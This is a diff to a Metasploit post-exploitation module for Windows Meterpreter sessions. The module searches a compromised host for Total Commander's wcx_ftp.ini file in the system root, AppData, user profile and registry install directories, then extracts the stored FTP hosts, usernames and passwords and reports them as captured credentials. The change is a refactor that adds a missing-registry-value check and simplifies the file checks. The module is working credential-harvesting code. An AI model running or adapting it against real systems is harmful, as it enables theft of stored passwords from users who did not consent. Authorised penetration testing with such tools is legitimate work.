@@ -1,5 +1,3 @@
-# $Id$
-
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
@@ -13,11 +11,14 @@ require 'rex/parser/ini'
 require 'msf/core/post/windows/user_profiles'
 require 'msf/core/post/windows/registry'
 require 'msf/core/auxiliary/report'
+require 'msf/core/post/file'
 
 class Metasploit3 < Msf::Post
+
 	include Msf::Post::Windows::Registry
 	include Msf::Auxiliary::Report
 	include Msf::Post::Windows::UserProfiles
+	include Msf::Post::File
 
 
 	def initialize(info={})
@@ -29,7 +30,6 @@ class Metasploit3 < Msf::Post
 				},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'theLightCosine'],
-				'Version'       => '$Revision$',
 				'Platform'      => [ 'win' ],
 				'SessionTypes'  => [ 'meterpreter' ]
 			))
@@ -54,8 +54,12 @@ class Metasploit3 < Msf::Post
 		when "wcx_ftp.ini"
 			print_status("Already Checked SYSTEMROOT")
 		when ".\\wcx_ftp.ini"
-			hklminstpath = registry_getvaldata(commander_key, 'InstallDir')
-			check_other(hklminstpath +'\\wcx_ftp.ini')
+			hklminstpath = registry_getvaldata(commander_key, 'InstallDir') || ''
+			if hklminstpath.empty?
+				print_error("Unable to find InstallDir in registry, skipping wcx_ftp.ini")
+			else
+				check_other(hklminstpath +'\\wcx_ftp.ini')
+			end
 		when /APPDATA/
 			print_status("Already Checked AppData")
 		when /USERPROFILE/
@@ -77,8 +81,12 @@ class Metasploit3 < Msf::Post
 			when "wcx_ftp.ini"
 				print_status("Already Checked SYSTEMROOT")
 			when ".\\wcx_ftp.ini"
-				hklminstpath = registry_getvaldata(profile_commander_key, 'InstallDir')
-				check_other(hklminstpath +'\\wcx_ftp.ini')
+				hklminstpath = registry_getvaldata(profile_commander_key, 'InstallDir') || ''
+				if hklminstpath.empty?
+					print_error("Unable to find InstallDir in registry, skipping wcx_ftp.ini")
+				else
+					check_other(hklminstpath +'\\wcx_ftp.ini')
+				end
 			when /APPDATA/
 				print_status("Already Checked AppData")
 
@@ -94,49 +102,25 @@ class Metasploit3 < Msf::Post
 
 
 	def check_userdir(path)
-		filename= "#{path}wcx_ftp.ini"
-		begin
-			iniexists = client.fs.file.stat(filename)
-			print_status("Found File at #{filename}")
-			get_ini(filename)
-
-		rescue
-			print_status("#{filename} not found ....")
-		end
-
+		filename = "#{path}\\wcx_ftp.ini"
+		check_other(filename)
 	end
 
 	def check_appdata(path)
-		filename= "#{path}\\GHISLER\\wcx_ftp.ini"
-		begin
-			iniexists = client.fs.file.stat(filename)
-			print_status("Found File at #{filename}")
-			get_ini(filename)
-
-		rescue
-			print_status("#{filename} not found ....")
-		end
-
+		filename = "#{path}\\GHISLER\\wcx_ftp.ini"
+		check_other(filename)
 	end
 
 	def check_systemroot
-		winpath= client.fs.file.expand_path("%SYSTEMROOT%")+'\\wcx_ftp.ini'
-		begin
-			iniexists = client.fs.file.stat(winpath)
-			print_status("Found File at #{winpath}")
-			get_ini(winpath)
-		rescue
-			print_status("#{winpath} not found ....")
-		end
+		winpath = expand_path("%SYSTEMROOT%")+'\\wcx_ftp.ini'
+		check_other(winpath)
 	end
 
 	def check_other(filename)
-		begin
-			iniexists = client.fs.file.stat(filename)
+		if file?(filename)
 			print_status("Found File at #{filename}")
 			get_ini(filename)
-
-		rescue
+		else
 			print_status("#{filename} not found ....")
 		end
 	end
@@ -164,14 +148,14 @@ class Metasploit3 < Msf::Post
 				source_id = nil
 			end
 			report_auth_info(
-						:host  => host,
-						:port => port,
-						:sname => 'ftp',
-						:source_id => source_id,
-						:source_type => "exploit",
-						:user => username,
-						:pass => passwd
-					)
+				:host  => host,
+				:port => port,
+				:sname => 'ftp',
+				:source_id => source_id,
+				:source_type => "exploit",
+				:user => username,
+				:pass => passwd
+			)
 		end
 	end
 
